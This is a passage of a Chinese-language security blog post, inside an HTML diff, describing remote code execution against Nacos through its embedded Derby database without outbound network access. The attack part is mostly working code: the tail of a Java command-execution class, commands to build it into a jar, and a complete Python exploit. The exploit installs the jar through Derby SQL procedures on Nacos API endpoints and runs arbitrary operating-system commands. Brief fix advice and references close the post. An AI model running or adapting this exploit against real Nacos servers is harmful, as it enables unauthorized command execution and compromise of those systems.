&#123;</span><br><span class="line">            <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintWriter</span>(sw);</span><br><span class="line">            e.printStackTrace(pw);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR: &quot;</span> + sw.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译之后，打包为一个jar包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -d . Garck3h.java</span><br><span class="line">jar cvf Garck3h.jar Garck3h.class</span><br></pre></td></tr></table></figure>
+<p><img src="yFW4hdvkBfEZjxypQvhJNUXGCavFSV978zrEq71-rHw.png" alt="image"></p>
+<p>把jar包和exp1.py放在同一个目录即可</p>
+<p>exp1.py的内容如下：</p>
+<ul>
+<li>exp主要是从本地读取了一个jar包，然后转为十六进制字符串 jar_hex</li>
+<li>使用 ThreadPoolExecutor 创建线程池，循环生成随机 ID 和文件名，提交并发任务。</li>
+<li>检查任务结果，如果找到有效结果，打印结果并停止线程池。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">from urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line">from concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">execute_task</span><span class="params">(target, command, jar_hex, removal_url, derby_url, id, random_filename)</span>:</span><br><span class="line">    # SQL 语句，用于将本地读取的JAR包数据写入数据库</span><br><span class="line">    post_sql = f<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(&#x27;values cast(X&#x27;&#x27;&#123;jar_hex&#125;&#x27;&#x27; as blob)&#x27;, &#x27;/tmp/&#123;random_filename&#125;&#x27;, &#x27;,&#x27;, &#x27;&quot;&#x27;, &#x27;UTF-8&#x27;, &#x27;/tmp/&#123;random_filename&#125;.jar&#x27;)</span></span><br><span class="line"><span class="string">    CALL SQLJ.INSTALL_JAR(&#x27;/tmp/&#123;random_filename&#125;.jar&#x27;, &#x27;APP.&#123;id&#125;&#x27;, 0)</span></span><br><span class="line"><span class="string">    CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;, &#x27;APP.&#123;id&#125;&#x27;)</span></span><br><span class="line"><span class="string">    CREATE FUNCTION S_EXAMPLE_&#123;id&#125;(PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#x27;Garck3h.executeCommand&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    option_sql = f<span class="string">&quot;UPDATE ROLES SET ROLE=&#x27;1&#x27; WHERE ROLE=&#x27;1&#x27; AND ROLE=S_EXAMPLE_&#123;id&#125;(&#x27;&#123;command&#125;&#x27;)&quot;</span></span><br><span class="line">    get_sql = f<span class="string">&quot;SELECT * FROM (SELECT COUNT(*) AS b, S_EXAMPLE_&#123;id&#125;(&#x27;&#123;command&#125;&#x27;) AS a FROM config_info) tmp /*ROWS FETCH NEXT*/&quot;</span></span><br><span class="line"></span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: post_sql&#125;</span><br><span class="line">    post_resp = requests.post(url=removal_url, files=files)</span><br><span class="line">    post_json = post_resp.json()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> post_json.get(<span class="string">&#x27;message&#x27;</span>, None) is None and post_json.get(<span class="string">&#x27;data&#x27;</span>, None) is not None:</span><br><span class="line">        get_resp = requests.get(url=derby_url, params=&#123;<span class="string">&#x27;sql&#x27;</span>: get_sql&#125;)</span><br><span class="line">        <span class="keyword">return</span> get_resp.text</span><br><span class="line">    <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">exploit</span><span class="params">(target, command, jar_file_path, max_workers=<span class="number">5</span>)</span>:</span><br><span class="line">    removal_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/data/removal&#x27;</span>)</span><br><span class="line">    derby_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/derby&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    # 读取本地JAR包数据</span><br><span class="line">    with <span class="title function_">open</span><span class="params">(jar_file_path, <span class="string">&#x27;rb&#x27;</span>)</span> as jar_file:</span><br><span class="line">        jar_data = jar_file.read()</span><br><span class="line"></span><br><span class="line">    # 将JAR包数据转换为十六进制字符串</span><br><span class="line">    jar_hex = jar_data.hex()</span><br><span class="line"></span><br><span class="line">    with <span class="title function_">ThreadPoolExecutor</span><span class="params">(max_workers=max_workers)</span> as executor:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            futures = []</span><br><span class="line">            <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(max_workers)</span>:  # 每次提交 max_workers 个任务</span><br><span class="line">                id = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">                random_filename = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">                    random.sample(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>, <span class="number">8</span>))</span><br><span class="line">                futures.append(executor.submit(execute_task, target, command, jar_hex, removal_url, derby_url, id,</span><br><span class="line">                                               random_filename))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> future in <span class="title function_">as_completed</span><span class="params">(futures)</span>:</span><br><span class="line">                result = future.result()</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    print(result)</span><br><span class="line">                    executor.shutdown(wait=False)</span><br><span class="line">                    <span class="keyword">return</span>  # 找到有效结果后退出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target = <span class="string">&#x27;http://127.0.0.1:8848&#x27;</span></span><br><span class="line">    command = <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">    jar_file_path = <span class="string">&#x27;Garck3h.jar&#x27;</span>  # 替换为你的默认JAR包文件路径</span><br><span class="line">    target = input(<span class="string">&#x27;请输入目录URL，默认：http://127.0.0.1:8848：&#x27;</span>) or <span class="type">target</span></span><br><span class="line">    <span class="variable">command</span> <span class="operator">=</span> input(<span class="string">&#x27;请输入命令，默认：whoami：&#x27;</span>) or <span class="type">command</span></span><br><span class="line">    <span class="variable">jar_file_path</span> <span class="operator">=</span> input(<span class="string">&#x27;请输入JAR包文件路径，默认：Garck3h.jar：&#x27;</span>) or jar_file_path</span><br><span class="line">    <span class="title function_">exploit</span><span class="params">(target=target, command=command, jar_file_path=jar_file_path)</span></span><br></pre></td></tr></table></figure>
+<p>最后还是执行一下id命令。成功返回了id执行的结果数据。</p>
+<p><img src="6m78Djqj27UVQHVcWNTCOQ3SWDUvTKs9X_M5l-PhQgk.png" alt="image"></p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
+<li>待官方发布安全更新，建议升级至最新版本。</li>
+<li>关闭Nacos对外暴露端口。</li>
+<li>更改口令为强口令：该漏洞需要登录成功后才能进一步利用</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/2pGDhXgvTQa1DqDK6nEn7A">https://mp.weixin.qq.com/s/2pGDhXgvTQa1DqDK6nEn7A</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce">http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nacos-New-RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">Nacos New RCE不出网利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">EXP分析及利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">不出网利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.6.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.7.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&text=Nacos New RCE不出网利用方式"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&is_video=false&description=Nacos New RCE不出网利用方式"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Nacos New RCE不出网利用方式&body=Check out this article: https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&title=Nacos New RCE不出网利用方式"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&name=Nacos New RCE不出网利用方式&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2024/07/17/Nacos%20New%20RCE%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/&t=Nacos New RCE不出网利用方式"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+    <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2019-2026
+        Garck3h
+    </div>
+    <div class="footer-right">
+        <nav>
+
+            <ul>
+                
+                    <!-- 不蒜子统计 -->
+                    <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+
+                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+
+
+        </nav>
+    </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
